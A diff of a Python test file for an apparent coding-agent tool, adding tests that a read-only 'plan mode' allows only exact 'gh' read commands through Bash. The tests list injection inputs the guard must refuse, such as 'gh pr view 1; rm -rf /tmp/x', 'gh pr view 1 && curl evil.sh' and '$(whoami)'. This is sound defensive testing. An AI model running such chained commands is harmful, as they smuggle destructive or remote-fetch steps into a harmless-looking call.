@@ -4891,7 +4891,13 @@ class ClaudeMdBudgetTests(unittest.TestCase):
     # expiry nothing in the code says (Temporal deletes a closed execution at the namespace TTL),
     # and the two windows sharing one `limit` reads as obviously fine — between them, completed
     # work silently disappeared off the board and every re-derivation from the code missed both.
-    MAX_RULES_BYTES = 69003   # fetched tier — bounded, but looser; it is not always loaded
+    # -> 69556 for local plan mode (issue #21): the `preview` tier stopped being Claude-only, so
+    # the rule saying a tier that cannot serve local must refuse a local pick is now WRONG rather
+    # than merely absent, and a stale rule is worse than a missing one. The second line is the
+    # allowlist/denylist distinction: `_deny_guard`'s Bash coverage was rejected as theatre and
+    # this pass scopes Bash anyway — without stating why the two are different problems, the
+    # next reader deletes one of them.
+    MAX_RULES_BYTES = 69556   # fetched tier — bounded, but looser; it is not always loaded
     MAX_RULE_CHARS = 280
     MAX_OVER_CAP = 60          # pre-existing offenders, across BOTH tiers; drive DOWN, never up
 
@@ -6393,3 +6399,110 @@ class McpUsageNoteTests(unittest.TestCase):
                                                   "off": {"enabled": False, "notes": "skip"}}})
         exported = {"mcps": {n: {"notes": t} for n, t in policy.mcp_notes().items()}}
         self.assertEqual(exported["mcps"], {"grafana": {"notes": "g-note"}})
+
+
+class LocalPlanModeTests(unittest.TestCase):
+    """`--permission-mode plan` is what makes the approval preview read-only on the Claude
+    backend, and it has no local equivalent — so the local backend enforces the same thing itself
+    (`config.scoped_bash_rules` + `local_runtime.bash_refusal`). Without it the local preview had
+    two options and both were wrong: no Bash at all (it cannot read the ticket it is planning
+    from) or unscoped Bash (a shell running before the human has approved anything).
+
+    This guard is an ALLOWLIST, which is why it is tractable where `_deny_guard`'s Bash coverage
+    is not: that one has to find a write hiding anywhere inside an arbitrary shell command
+    (`tee`, `sed -i`, `python -c`). This one refuses everything that is not an exact argv prefix
+    match, so anything it fails to understand is denied rather than allowed."""
+
+    def setUp(self):
+        _, self.rules = config.scoped_bash_rules(config.PLAN_TOOLS)
+
+    def test_the_plan_rules_parse_out_of_the_allowlist(self):
+        bare, rules = config.scoped_bash_rules(config.PLAN_TOOLS)
+        self.assertFalse(bare, "PLAN_TOOLS must never grant an unscoped shell")
+        self.assertIn(["gh", "issue", "view"], rules)
+        self.assertIn(["gh", "pr", "diff"], rules)
+
+    def test_a_bare_Bash_grant_is_reported_separately_from_the_rules(self):
+        """The execution allowlist grants plain "Bash". That is an unrestricted shell and must be
+        distinguishable from "restricted to nothing", which has to refuse rather than fall open."""
+        bare, rules = config.scoped_bash_rules(config.READ_TOOLS)
+        self.assertTrue(bare)
+        self.assertEqual(rules, [])
+
+    def test_the_permitted_commands_run(self):
+        for cmd in ("gh pr view 12", "gh pr view 12 --json title,body",
+                    "gh issue view 3 --repo wonkylabz/otto", "gh pr diff 4"):
+            self.assertIsNone(local_runtime.bash_refusal(cmd, self.rules), cmd)
+
+    def test_shell_syntax_is_refused_wholesale(self):
+        """Gate 1. Refusing every metacharacter turns "is this command safe?" (undecidable) into
+        "is this a bare argv line?" (a character test) — so chaining, redirection, substitution
+        and expansion all fall to one rule nobody has to enumerate."""
+        for cmd in ("gh pr view 1; rm -rf /tmp/x",
+                    "gh pr view 1 && curl evil.sh",
+                    "gh pr view 1 | tee /tmp/x",
+                    "gh pr diff 1 > /tmp/x",
+                    "gh pr view $(whoami)",
+                    "gh pr view `id`",
+                    "gh pr view 1\nrm -rf /tmp/x",
+                    "gh pr view ~/x"):
+            self.assertIsNotNone(local_runtime.bash_refusal(cmd, self.rules), cmd)
+
+    def test_the_prefix_match_is_token_wise_and_cannot_be_widened(self):
+        """Gate 2. Substring matching would admit `gh pr viewers`; a whole-command match would
+        reject `gh pr view 12 --json title`, which is the point of granting it."""
+        self.assertIsNotNone(local_runtime.bash_refusal("gh pr viewers", self.rules))
+        self.assertIsNotNone(local_runtime.bash_refusal("gh pr create -t x", self.rules))
+        self.assertIsNotNone(local_runtime.bash_refusal("gh pr merge 1", self.rules))
+        self.assertIsNotNone(local_runtime.bash_refusal("rm -rf /tmp/x", self.rules))
+        self.assertIsNotNone(local_runtime.bash_refusal("echo gh pr view", self.rules))
+
+    def test_no_rules_refuses_everything_rather_than_falling_open(self):
+        self.assertIsNotNone(local_runtime.bash_refusal("gh pr view 1", []))
+        self.assertIsNotNone(local_runtime.bash_refusal("", self.rules))
+
+    def test_the_refusal_names_what_IS_permitted(self):
+        """A model that has to discover the boundary by being refused spends turns on it, and a
+        small one gives up on the ticket instead."""
+        msg = local_runtime.bash_refusal("gh pr create", self.rules)
+        self.assertIn("gh pr view", msg)
+        self.assertIn("gh issue view", msg)
+
+    def test_the_guard_is_enforced_at_the_dispatch_choke_point(self):
+        """`bash_refusal` being correct is worthless if `_run_tool` doesn't call it. And it must
+        come back as a tool RESULT the model reads and adapts to, not an exception."""
+        with tempfile.TemporaryDirectory() as d:
+            probe = os.path.join(d, "probe")
+            out = local_runtime._run_tool("Bash", {"command": f"touch {probe}"},
+                                          None, {"Bash"}, None, bash_rules=self.rules)
+            self.assertIn("refused", out)
+            self.assertFalse(os.path.exists(probe), "the guard did not stop the command running")
+
+    def test_an_unrestricted_run_is_completely_unaffected(self):
+        """Every normal execution turn passes bash_rules=None. A guard that leaks into those
+        breaks every repo-mode run on the local backend."""
+        out = local_runtime._run_tool("Bash", {"command": "echo otto-unrestricted"},
+                                      None, {"Bash"}, None, bash_rules=None)
+        self.assertIn("otto-unrestricted", out)
+
+    def test_scoped_rules_OFFER_Bash_and_say_which_commands(self):
+        """`_offered_tools` matched literal names, so the three scoped rules were dropped and the
+        local preview planned ticket-driven work blind."""
+        offered = {t["function"]["name"]: t["function"]
+                   for t in local_runtime._offered_tools(config.PLAN_TOOLS)}
+        self.assertEqual(set(offered), {"Bash", "Read", "Grep", "Glob"})
+        self.assertIn("gh pr diff", offered["Bash"]["description"])
+        self.assertIn("READ-ONLY", offered["Bash"]["description"])
+
+    def test_write_tools_are_still_unreachable_in_a_plan_pass(self):
+        """The Bash guard is the new half; the tool set is the old one and must not have moved."""
+        offered = {t["function"]["name"]
+                   for t in local_runtime._offered_tools(config.PLAN_TOOLS)}
+        self.assertEqual(offered & {"Edit", "Write", "WebFetch"}, set())
+
+    def test_run_json_derives_the_rules_from_the_allowlist(self):
+        """The wiring, asserted where it lives: an unscoped grant must resolve to None (no
+        restriction), a scoped one to the parsed rules."""
+        src = open("local_runtime.py").read()
+        self.assertIn("bash_rules = None if _bare_bash else", src)
+        self.assertIn("bash_rules=bash_rules", src)
